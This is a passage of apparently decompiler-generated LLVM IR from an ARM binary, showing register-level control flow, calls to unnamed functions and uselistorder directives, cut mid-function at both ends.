  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1c614 = load i32, i32* @r6, align 4
  %v1_1c614 = add i32 %v0_1c614, 1
  store i32 %v1_1c614, i32* @r0, align 4
  %v0_1c618 = load i32, i32* @r5, align 4
  %v2_1c618 = add i32 %v0_1c618, %storemerge
  store i32 %v2_1c618, i32* @r4, align 4
  %v1_1c61c = call i32 @function_161fc(i32 %v1_1c614)
  %v2_1c61c = trunc i32 %v1_1c61c to i8
  %v3_1c620 = load i32, i32* @r4, align 4
  %v4_1c620 = inttoptr i32 %v3_1c620 to i8*
  store i8 %v2_1c61c, i8* %v4_1c620, align 1
  br label %dec_label_pc_1c65c.backedge

dec_label_pc_1c628:                               ; preds = %dec_label_pc_1c3c8
  store i32 ptrtoint ([8 x i8]* @global_var_23d08.1139 to i32), i32* %r3.global-to-local, align 4
  store i32 28352, i32* @sb, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23d08.1139, i32 0, i32 0), i8** %stack_var_-560, align 4
  %v2_1c65c = ptrtoint i32* %stack_var_-288 to i32
  %v1_1c404 = bitcast i32* %stack_var_-288 to i8*
  %v2_1c434 = ptrtoint i8** %stack_var_-68 to i32
  %v2_1c448 = bitcast i8** %stack_var_-68 to i8*
  %v2_1c454 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1c46c = ptrtoint i32* %stack_var_-64 to i32
  %v2_1c484 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1c4c8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1c65c, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v7_1c3f0, i32* %r2.global-to-local, align 4
  %v3_1c66c73 = call i32 @function_1929c(i32 %v2_1c65c, i32 128, i32 %v7_1c3f0)
  %v2_1c67075 = icmp eq i32 %v3_1c66c73, 0
  br i1 %v2_1c67075, label %dec_label_pc_1c678, label %dec_label_pc_1c400

dec_label_pc_1c678:                               ; preds = %dec_label_pc_1c65c.backedge, %dec_label_pc_1c628
  %v0_1c678 = load i32, i32* @fp, align 4
  %v1_1c67c = inttoptr i32 %v0_1c678 to i16*
  %v2_1c67c = call i32 @function_17f20(i16* %v1_1c67c)
  br label %dec_label_pc_1c680

dec_label_pc_1c680:                               ; preds = %dec_label_pc_1c3c8, %dec_label_pc_1c678
  %v4_1c684 = load i32, i32* @global_var_32ee0.1105, align 4
  store i32 %v4_1c684, i32* %r3.global-to-local, align 4
  %v2_1c688 = icmp eq i32 %v4_1c684, 0
  br i1 %v2_1c688, label %dec_label_pc_1c690, label %dec_label_pc_1c6cc

dec_label_pc_1c690:                               ; preds = %dec_label_pc_1c680
  %v1_1c694 = call i32 @function_14ccc(i32 28)
  store i32 -33536, i32* %r3.global-to-local, align 4
  store i32 28344, i32* %r2.global-to-local, align 4
  %v2_1c6a0 = icmp eq i32 %v1_1c694, 0
  br i1 %v2_1c6a0, label %.thread8.thread, label %bb70

.thread8.thread:                                  ; preds = %dec_label_pc_1c690
  store i32 ptrtoint (i32* @global_var_23d24.1142 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23d24.1142 to i32), i32* @global_var_32edc.1107, align 4
  br label %.thread10

bb70:                                             ; preds = %dec_label_pc_1c690
  store i32 %v1_1c694, i32* @global_var_32edc.1107, align 4
  %v1_1c6b012 = load i32, i32* @r5, align 4
  %v3_1c6b014 = add i32 %v1_1c6b012, -33536
  store i32 %v3_1c6b014, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8.thread, %bb70
  store i32 116412, i32* @lr, align 4
  %v1_1c6b8 = xor i1 %v2_1c6a0, true
  call void @__pseudo_cond_branch(i1 %v1_1c6b8, i32 ptrtoint (i32* @global_var_14000.915 to i32))
  store i32 28348, i32* %r2.global-to-local, align 4
  %v4_1c6c0 = load i32, i32* @global_var_32ee0.1105, align 4
  %v1_1c6c4 = add i32 %v4_1c6c0, 1
  store i32 %v1_1c6c4, i32* %r3.global-to-local, align 4
  store i32 %v1_1c6c4, i32* @global_var_32ee0.1105, align 4
  br label %dec_label_pc_1c6cc

dec_label_pc_1c6cc:                               ; preds = %dec_label_pc_1c680, %.thread10
  store i32 28352, i32* @r7, align 4
  %v4_1c6d0 = load i8, i8* @global_var_32ee4.1101, align 1
  %v5_1c6d0 = sext i8 %v4_1c6d0 to i32
  store i32 %v5_1c6d0, i32* @r4, align 4
  %v2_1c6d4 = icmp eq i8 %v4_1c6d0, 0
  br i1 %v2_1c6d4, label %dec_label_pc_1c6dc, label %dec_label_pc_1c75c

dec_label_pc_1c6dc:                               ; preds = %dec_label_pc_1c6cc
  %v2_1c6dc = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1c6dc, i32* @r6, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1c6e8 = call i32 @function_1cbd4(i32 %v2_1c6dc, i32 255)
  %v2_1c6ec = icmp eq i32 %v2_1c6e8, 0
  br i1 %v2_1c6ec, label %dec_label_pc_1c6f8, label %dec_label_pc_1c75c

dec_label_pc_1c6f8:                               ; preds = %dec_label_pc_1c6dc
  store i32 %v2_1c6dc, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1c700 = call i32 @function_142f0(i32 %v2_1c6dc, i32 46)
  %v2_1c704 = icmp eq i32 %v2_1c700, 0
  br i1 %v2_1c704, label %dec_label_pc_1c75c, label %dec_label_pc_1c70c

dec_label_pc_1c70c:                               ; preds = %dec_label_pc_1c6f8
  %v1_1c70c = add i32 %v2_1c700, 1
  %v2_1c70c = inttoptr i32 %v1_1c70c to i8*
  %v3_1c70c = load i8, i8* %v2_1c70c, align 1
  %v4_1c70c = zext i8 %v3_1c70c to i32
  store i32 %v4_1c70c, i32* %r3.global-to-local, align 4
  %v2_1c710 = icmp eq i8 %v3_1c70c, 0
  br i1 %v2_1c710, label %dec_label_pc_1c75c, label %dec_label_pc_1c71c

dec_label_pc_1c71c:                               ; preds = %dec_label_pc_1c70c
  %v1_1c71c = call i32 @function_1cd20(i32 %v1_1c70c)
  store i32 %v1_1c71c, i32* @r4, align 4
  %v2_1c720 = icmp eq i32 %v1_1c71c, 0
  br i1 %v2_1c720, label %dec_label_pc_1c75c, label %dec_label_pc_1c728

dec_label_pc_1c728:                               ; preds = %dec_label_pc_1c71c
  %v1_1c72c = call i32 @function_14ccc(i32 4)
  store i32 28340, i32* %r3.global-to-local, align 4
  %v2_1c734 = icmp eq i32 %v1_1c72c, 0
  %v5_1c738 = trunc i32 %v1_1c72c to i8
  store i8 %v5_1c738, i8* @global_var_32ed8.1102, align 4
  br i1 %v2_1c734, label %dec_label_pc_1c740, label %dec_label_pc_1c74c

dec_label_pc_1c740:                               ; preds = %dec_label_pc_1c728
  %v0_1c740 = load i32, i32* @r4, align 4
  store i32 %v0_1c740, i32* @r0, align 4
  %v0_1c744 = call i32 @function_15850()
  br label %dec_label_pc_1c75c

dec_label_pc_1c74c:                               ; preds = %dec_label_pc_1c728
  %v4_1c74c = load i8, i8* @global_var_32ee4.1101, align 1
  %v5_1c74c = sext i8 %v4_1c74c to i32
  %v1_1c750 = add nsw i32 %v5_1c74c, 1
  store i32 %v1_1c750, i32* %r3.global-to-local, align 4
  %v0_1c754 = load i32, i32* @r4, align 4
  %v2_1c754 = inttoptr i32 %v1_1c72c to i32*
  store i32 %v0_1c754, i32* %v2_1c754, align 4
  %v0_1c758 = load i32, i32* %r3.global-to-local, align 4
  %v5_1c758 = trunc i32 %v0_1c758 to i8
  store i8 %v5_1c758, i8* @global_var_32ee4.1101, align 4
  br label %dec_label_pc_1c75c

dec_label_pc_1c75c:                               ; preds = %dec_label_pc_1c6dc, %dec_label_pc_1c6cc, %dec_label_pc_1c3b8, %dec_label_pc_1c71c, %dec_label_pc_1c70c, %dec_label_pc_1c6f8, %dec_label_pc_1c740, %dec_label_pc_1c74c
  store i32 28336, i32* %r3.global-to-local, align 4
  %v4_1c760 = load i32, i32* @global_var_32ed4.1117, align 4
  %v2_1c764 = icmp eq i32 %v4_1c760, 0
  br i1 %v2_1c764, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_1c75c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_1c75c, %bb71
  %v2_1c76c = xor i1 %v2_1c764, true
  call void @__pseudo_cond_branch(i1 %v2_1c76c, i32 %v4_1c760)
  store i32 %v3_1c368, i32* %r4.global-to-local, align 4
  store i32 %v15_1c368, i32* @r8, align 4
  store i32 %v18_1c368, i32* @sb, align 4
  store i32 %v21_1c368, i32* @sl, align 4
  store i32 %v24_1c368, i32* @fp, align 4
  ret i32 %v4_1c760

dec_label_pc_1c7c4:                               ; preds = %dec_label_pc_1c388
  store i32 %.v1_1c39c, i32* @global_var_32ae8.1121, align 4
  store i32 28344, i32* %r4.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_f84c.1144 to i32), i32 116696), i32* @r5, align 4
  %v4_1c7d8 = load i32, i32* @global_var_32edc.1107, align 4
  store i32 ptrtoint (i32* @global_var_23d24.1142 to i32), i32* %r3.global-to-local, align 4
  store i32 116716, i32* @lr, align 4
  %v1_1c7e8 = icmp ne i32 %v4_1c7d8, ptrtoint (i32* @global_var_23d24.1142 to i32)
  call void @__pseudo_cond_branch(i1 %v1_1c7e8, i32 ptrtoint (i32* @global_var_15850.966 to i32))
  store i32 28352, i32* @r7, align 4
  store i32 28340, i32* @r6, align 4
  store i32 0, i32* @global_var_32ee0.1105, align 4
  store i32 0, i32* @global_var_32edc.1107, align 4
  %v4_1c81876 = load i8, i8* @global_var_32ee4.1101, align 1
  %v5_1c81877 = sext i8 %v4_1c81876 to i32
  store i32 %v5_1c81877, i32* @r4, align 4
  %v2_1c81c79 = icmp eq i8 %v4_1c81876, 0
  %v1_1c82080 = add nsw i32 %v5_1c81877, -1
  store i32 %v1_1c82080, i32* %r2.global-to-local, align 4
  store i32 28340, i32* %r3.global-to-local, align 4
  %v4_1c82c81 = load i8, i8* @global_var_32ed8.1102, align 1
  %v5_1c82c82 = sext i8 %v4_1c82c81 to i32
  br i1 %v2_1c81c79, label %dec_label_pc_1c82c, label %dec_label_pc_1c808

dec_label_pc_1c808:                               ; preds = %dec_label_pc_1c7c4, %dec_label_pc_1c808
  %v5_1c82c84 = phi i32 [ %v5_1c82c, %dec_label_pc_1c808 ], [ %v5_1c82c82, %dec_label_pc_1c7c4 ]
  %v1_1c82083 = phi i32 [ %v1_1c820, %dec_label_pc_1c808 ], [ %v1_1c82080, %dec_label_pc_1c7c4 ]
  store i32 %v5_1c82c84, i32* %r3.global-to-local, align 4
  %v5_1c80c = trunc i32 %v1_1c82083 to i8
  store i8 %v5_1c80c, i8* @global_var_32ee4.1101, align 4
  %v4_1c810 = mul nsw i32 %v1_1c82083, 4
  %v5_1c810 = add i32 %v5_1c82c84, %v4_1c810
  %v6_1c810 = inttoptr i32 %v5_1c810 to i32*
  %v7_1c810 = load i32, i32* %v6_1c810, align 4
  store i32 %v7_1c810, i32* @r0, align 4
  %v0_1c814 = call i32 @function_15850()
  %v0_1c824.pre = load i32, i32* @r6, align 4
  %v4_1c818 = load i8, i8* @global_var_32ee4.1101, align 1
  %v5_1c818 = sext i8 %v4_1c818 to i32
  store i32 %v5_1c818, i32* @r4, align 4
  %v2_1c81c = icmp eq i8 %v4_1c818, 0
  %v1_1c820 = add nsw i32 %v5_1c818, -1
  store i32 %v1_1c820, i32* %r2.global-to-local, align 4
  store i32 %v0_1c824.pre, i32* %r3.global-to-local, align 4
  %v4_1c82c = load i8, i8* @global_var_32ed8.1102, align 1
  %v5_1c82c = sext i8 %v4_1c82c to i32
  br i1 %v2_1c81c, label %dec_label_pc_1c82c, label %dec_label_pc_1c808

dec_label_pc_1c82c:                               ; preds = %dec_label_pc_1c808, %dec_label_pc_1c7c4
  %v5_1c82c.lcssa = phi i32 [ %v5_1c82c82, %dec_label_pc_1c7c4 ], [ %v5_1c82c, %dec_label_pc_1c808 ]
  store i32 %v5_1c82c.lcssa, i32* @r0, align 4
  %v0_1c830 = call i32 @function_15850()
  %v0_1c834 = load i32, i32* @r4, align 4
  %v5_1c834 = trunc i32 %v0_1c834 to i8
  store i8 %v5_1c834, i8* @global_var_32ed8.1102, align 4
  store i32 %v1_1c39c, i32* %r4.global-to-local, align 4
  ret i32 %v0_1c830

; uselistorder directives
  uselistorder i32 %v1_1c820, { 1, 0 }
  uselistorder i32 %v5_1c82c84, { 1, 0 }
  uselistorder i32 %v2_1c6dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1c46c, { 1, 0 }
  uselistorder i32 %v2_1c454, { 1, 0 }
  uselistorder i32 %v2_1c65c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1c5bc, { 1, 0, 2 }
  uselistorder i32 %v1_1c53423, { 1, 0 }
  uselistorder i32 %v1_1c52c16, { 1, 0 }
  uselistorder i32 %v0_1c52c15, { 1, 0 }
  uselistorder i32 %v1_1c534, { 1, 0 }
  uselistorder i32 %v4_1c4c0, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v3_1c4b0, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-560, { 1, 0 }
  uselistorder i8** %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 22, 0, 14, 15, 16, 27, 19, 17, 18, 20, 21, 23, 24, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 0, 6, 17, 7, 16, 14, 8, 9, 10, 11, 12, 13, 15, 18 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 17, 0, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 16, 15 }
  uselistorder i8* @global_var_32ee4.1101, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_23d24.1142 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i16*)* @function_17f20, { 1, 0 }
  uselistorder i32 28352, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_161fc, { 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 1, 8, 6, 9, 2, 0, 3, 4, 5, 7 }
  uselistorder i32 (i32)* @function_1cd20, { 2, 1, 0 }
  uselistorder i8* @global_var_32ed8.1102, { 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 28340, { 1, 3, 6, 4, 5, 0, 2, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_23d00.1137 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_23cf8.1135 to i32), { 1, 0 }
  uselistorder i32 (i32*, i32)* @function_1a744, { 1, 2, 0 }
  uselistorder i32* @global_var_32edc.1107, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 28344, { 0, 2, 1 }
  uselistorder i32 28348, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_13ed0, { 21, 23, 24, 1, 25, 20, 19, 26, 27, 17, 18, 37, 36, 22, 0, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 33, 35, 30, 34, 31, 32 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_23cec.1133 to i32), { 1, 0 }
  uselistorder i32 ()* @function_1c2bc, { 2, 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2390c.969 to i32), { 0, 2, 1, 3 }
  uselistorder i8 3, { 0, 2, 1, 3 }
  uselistorder i32 2123, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32* @global_var_32ee0.1105, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_23cd8.1119 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c808, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_1c75c, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c6cc, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_1c680, { 1, 0 }
  uselistorder label %dec_label_pc_1c678, { 1, 0 }
  uselistorder label %dec_label_pc_1c53c, { 1, 0 }
  uselistorder label %dec_label_pc_1c65c.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
}

define i32 @function_1c85c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1c85c:
  %v0_1c85c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1c898 = call i32 @function_1cf84()
  store i32 %v0_1c85c, i32* @lr, align 4
  ret i32 %v0_1c898
}

define i32 @function_1c8a8() local_unnamed_addr {
dec_label_pc_1c8a8:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1c8b0 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1c8bc = load i32, i32* @r0, align 4
  store i32 %v0_1c8bc, i32* @sl, align 4
  %v2_1c8bc = icmp eq i32 %v0_1c8bc, 0
  %v2_1c8c0 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1c8c0, align 4
  %v0_1c8c4 = load i32, i32* @r1, align 4
  store i32 %v0_1c8c4, i32* @r7, align 4
  %v0_1c8c8 = load i32, i32* @r3, align 4
  store i32 %v0_1c8c8, i32* @r6, align 4
  br i1 %v2_1c8bc, label %bb, label %dec_label_pc_1c8d4

bb:                                               ; preds = %dec_label_pc_1c8a8
  %v1_1c8cc = load i32, i32* @r5, align 4
  %v2_1c8cc = add i32 %v1_1c8cc, 22
  store i32 %v2_1c8cc, i32* @r5, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1c8d4:                               ; preds = %dec_label_pc_1c8a8
  %v0_1c8d4 = call i32 @function_12b24()
  store i32 %v0_1c8d4, i32* %r0.global-to-local, align 4
  %v3_1c8d8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c8d8, i32* %ip.global-to-local, align 4
  %v1_1c8dc = inttoptr i32 %v0_1c8d4 to i32*
  %v2_1c8dc = load i32, i32* %v1_1c8dc, align 4
  store i32 %v2_1c8dc, i32* @r8, align 4
  %v0_1c8e0 = load i32, i32* @r5, align 4
  store i32 %v0_1c8e0, i32* %v1_1c8dc, align 4
  %v0_1c8e4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1c8d4, i32* @r4, align 4
  %v0_1c8f4 = load i32, i32* @sl, align 4
  store i32 %v0_1c8f4, i32* %r0.global-to-local, align 4
  %v0_1c8f8 = load i32, i32* @r7, align 4
  store i32 %v0_1c8f8, i32* %r2.global-to-local, align 4
  store i32 %v0_1c8b0, i32* %r3.global-to-local, align 4
  %v0_1c900 = load i32, i32* @r6, align 4
  %v7_1c908 = call i32 @function_1c85c(i32 %v0_1c8f4, i32 2, i32 %v0_1c8f8, i32 %v0_1c8b0, i32 %v0_1c900, i32 %v0_1c8e4, i32 %tmp18)
  store i32 %v7_1c908, i32* %r0.global-to-local, align 4
  store i32 %v7_1c908, i32* @r5, align 4
  %v2_1c90c = icmp eq i32 %v7_1c908, 0
  br i1 %v2_1c90c, label %bb34, label %dec_label_pc_1c918

bb34:                                             ; preds = %dec_label_pc_1c8d4
  %v1_1c910 = load i32, i32* @r8, align 4
  %v2_1c910 = load i32, i32* @r4, align 4
  %v3_1c910 = inttoptr i32 %v2_1c910 to i32*
  store i32 %v1_1c910, i32* %v3_1c910, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1c918:                               ; preds = %dec_label_pc_1c8d4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1c91c = inttoptr i32 %tmp18 to i32*
  %v2_1c91c = load i32, i32* %v1_1c91c, align 4
  store i32 %v2_1c91c, i32* %r3.global-to-local, align 4
  %v7_1c920 = icmp eq i32 %v2_1c91c, 1
  br i1 %v7_1c920, label %dec_label_pc_1c93c, label %dec_label_pc_1c928

dec_label_pc_1c928:                               ; preds = %dec_label_pc_1c918
  %v7_1c928 = icmp eq i32 %v2_1c91c, 4
  br i1 %v7_1c928, label %dec_label_pc_1c95c, label %dec_label_pc_1c930

dec_label_pc_1c930:                               ; preds = %dec_label_pc_1c928
  %v3_1c930 = icmp eq i32 %v2_1c91c, -1
  br i1 %v3_1c930, label %dec_label_pc_1c950, label %dec_label_pc_1cb90

dec_label_pc_1c93c:                               ; preds = %dec_label_pc_1c918
  %v7_1c93c = icmp eq i32 %v7_1c908, 2
  br i1 %v7_1c93c, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1c93c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1c964

.thread4:                                         ; preds = %dec_label_pc_1c93c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c964

dec_label_pc_1c950:                               ; preds = %dec_label_pc_1c930
  %v0_1c950 = load i32, i32* @r4, align 4
  %v1_1c950 = inttoptr i32 %v0_1c950 to i32*
  %v2_1c950 = load i32, i32* %v1_1c950, align 4
  store i32 %v2_1c950, i32* %r3.global-to-local, align 4
  %v7_1c954 = icmp eq i32 %v2_1c950, 2
  br i1 %v7_1c954, label %dec_label_pc_1c95c, label %dec_label_pc_1cb90

dec_label_pc_1c95c:                               ; preds = %dec_label_pc_1c950, %dec_label_pc_1c928
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c964

dec_label_pc_1c964:                               ; preds = %.thread4, %bb35, %dec_label_pc_1c95c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1c95c ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1c96c = load i32, i32* @r8, align 4
  %v1_1c96c = load i32, i32* @r4, align 4
  %v2_1c96c = inttoptr i32 %v1_1c96c to i32*
  store i32 %v0_1c96c, i32* %v2_1c96c, align 4
  %v0_1c970 = load i32, i32* @sl, align 4
  store i32 %v0_1c970, i32* @r0, align 4
  %v0_1c974 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c974 = load i32, i32* @ip, align 4
  %v2_1c974 = inttoptr i32 %v1_1c974 to i32*
  store i32 %v0_1c974, i32* %v2_1c974, align 4
  %v0_1c978 = call i32 @function_13f70()
  store i32 %v0_1c978, i32* %r0.global-to-local, align 4
  %v1_1c97c = add i32 %v0_1c978, 1
  store i32 %v1_1c97c, i32* @r4, align 4
  %v0_1c980 = load i32, i32* @r6, align 4
  %v7_1c984 = icmp sgt i32 %v0_1c980, %v1_1c97c
  br i1 %v7_1c984, label %dec_label_pc_1c988, label %dec_label_pc_1cb8c

dec_label_pc_1c988:                               ; preds = %dec_label_pc_1c964
  %v0_1c988 = load i32, i32* @sl, align 4
  store i32 %v0_1c988, i32* @r1, align 4
  store i32 %v1_1c97c, i32* @r2, align 4
  store i32 %v0_1c8b0, i32* @r0, align 4
  %v0_1c994 = call i32 @function_14000()
  store i32 %v0_1c994, i32* %r0.global-to-local, align 4
  %v1_1c99c = load i32, i32* @r4, align 4
  %v2_1c99c = add i32 %v1_1c99c, %v0_1c8b0
  %v1_1c9a0 = sub i32 0, %v2_1c99c
  %v1_1c9a4 = load i32, i32* @r6, align 4
  %v2_1c9a4 = sub i32 %v1_1c9a4, %v1_1c99c
  store i32 %v2_1c9a4, i32* %r2.global-to-local, align 4
  %v1_1c9a8 = urem i32 %v1_1c9a0, 4
  store i32 %v1_1c9a8, i32* %r3.global-to-local, align 4
  %v2_1c9ac = sub i32 %v2_1c9a4, %v1_1c9a8
  store i32 %v2_1c9ac, i32* @sb, align 4
  %v1_1c9b0 = add i32 %v2_1c9ac, -8
  store i32 %v1_1c9b0, i32* @r5, align 4
  %v7_1c9b8 = icmp slt i32 %v1_1c9b0, 256
  br i1 %v7_1c9b8, label %dec_label_pc_1cb8c, label %dec_label_pc_1c9bc

dec_label_pc_1c9bc:                               ; preds = %dec_label_pc_1c988
  %v2_1c9bc = add i32 %v1_1c9a8, %v2_1c99c
  store i32 %v2_1c9bc, i32* @fp, align 4
  store i32 %v0_1c8b0, i32* %ip.global-to-local, align 4
  %v1_1c9c4 = add i32 %v2_1c9bc, 8
  store i32 %v1_1c9c4, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1c9cc = add i32 %v2_1c9bc, 16
  store i32 %v1_1c9cc, i32* @r8, align 4
  %v4_1c9d0 = inttoptr i32 %v2_1c9bc to i32*
  store i32 %v0_1c8b0, i32* %v4_1c9d0, align 4
  %v0_1c9d4 = load i32, i32* @sl, align 4
  store i32 %v0_1c9d4, i32* %r0.global-to-local, align 4
  %v0_1c9d8 = load i32, i32* @r4, align 4
  %v1_1c9d8 = load i32, i32* @fp, align 4
  %v2_1c9d8 = add i32 %v1_1c9d8, 4
  %v3_1c9d8 = inttoptr i32 %v2_1c9d8 to i32*
  store i32 %v0_1c9d8, i32* %v3_1c9d8, align 4
  %v0_1c9dc = load i32, i32* @r8, align 4
  %v2_1c9e0 = inttoptr i32 %v0_1c9d4 to i8*
  %v3_1c9e0 = call i32 @function_1a278(i8* %v2_1c9e0, i32 %v0_1c9dc)
  store i32 %v3_1c9e0, i32* %r0.global-to-local, align 4
  %v1_1c9e4 = load i32, i32* @r4, align 4
  %v9_1c9e4 = icmp eq i32 %v3_1c9e0, %v1_1c9e4
  br i1 %v9_1c9e4, label %dec_label_pc_1ca28, label %dec_label_pc_1c9ec

dec_label_pc_1c9ec:                               ; preds = %dec_label_pc_1c9bc
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1c9f0 = load i32, i32* @r7, align 4
  %v2_1c9f0 = add i32 %v1_1c9f0, 8
  %v3_1c9f0 = inttoptr i32 %v2_1c9f0 to i32*
  store i32 2, i32* %v3_1c9f0, align 4
  %v0_1c9f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c9f4 = mul i32 %v0_1c9f4, 2
  %v1_1c9f8 = load i32, i32* @r7, align 4
  %v2_1c9f8 = add i32 %v1_1c9f8, 12
  %v3_1c9f8 = inttoptr i32 %v2_1c9f8 to i32*
  store i32 %v2_1c9f4, i32* %v3_1c9f8, align 4
  %v3_1c9fc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c9fc, i32* %r2.global-to-local, align 4
  store i32 %v0_1c8b0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1ca08 = load i32, i32* @r4, align 4
  store i32 %v0_1ca08, i32* @r5, align 4
  %v0_1ca0c = load i32, i32* @r8, align 4
  %v1_1ca0c = load i32, i32* @fp, align 4
  %v2_1ca0c = add i32 %v1_1ca0c, 8
  %v3_1ca0c = inttoptr i32 %v2_1ca0c to i32*
  store i32 %v0_1ca0c, i32* %v3_1ca0c, align 4
  %v0_1ca10 = load i32, i32* @r7, align 4
  %v1_1ca10 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ca10 = inttoptr i32 %v1_1ca10 to i32*
  store i32 %v0_1ca10, i32* %v2_1ca10, align 4
  %v0_1ca14 = load i32, i32* @r7, align 4
  %v1_1ca14 = inttoptr i32 %v0_1ca14 to i32*
  %v2_1ca14 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1ca14, i32* %v1_1ca14, align 4
  %v3_1ca14 = add i32 %v0_1ca14, 4
  %v4_1ca14 = inttoptr i32 %v3_1ca14 to i32*
  %v5_1ca14 = load i32, i32* @fp, align 4
  store i32 %v5_1ca14, i32* %v4_1ca14, align 4
  %v0_1ca18 = load i32, i32* @r6, align 4
  %v1_1ca18 = load i32, i32* @r7, align 4
  %v2_1ca18 = add i32 %v1_1ca18, 16
  %v3_1ca18 = inttoptr i32 %v2_1ca18 to i32*
  store i32 %v0_1ca18, i32* %v3_1ca18, align 4
  %v0_1ca1c = load i32, i32* @r4, align 4
  %v1_1ca1c = load i32, i32* @ip, align 4
  %v2_1ca1c = inttoptr i32 %v1_1ca1c to i32*
  store i32 %v0_1ca1c, i32* %v2_1ca1c, align 4
  %v0_1ca20 = load i32, i32* @r4, align 4
  %v1_1ca20 = load i32, i32* @r6, align 4
  %v2_1ca20 = add i32 %v1_1ca20, 4
  %v3_1ca20 = inttoptr i32 %v2_1ca20 to i32*
  store i32 %v0_1ca20, i32* %v3_1ca20, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1ca28:                               ; preds = %dec_label_pc_1c9bc
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1ca2c = icmp eq i32 %storemerge2, 0
